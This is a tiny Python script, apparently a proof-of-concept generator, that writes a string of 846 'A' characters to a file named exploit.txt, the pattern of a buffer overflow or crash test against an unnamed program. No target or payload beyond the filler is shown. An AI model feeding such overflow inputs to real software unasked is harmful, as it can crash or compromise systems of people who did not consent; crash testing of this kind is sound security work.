#!/usr/bin/env python3

exploit = 'A' * 846

try:
    with open("exploit.txt","w") as file:
        file.write(exploit)
    print("POC is created")
except:
    print("POC not created")
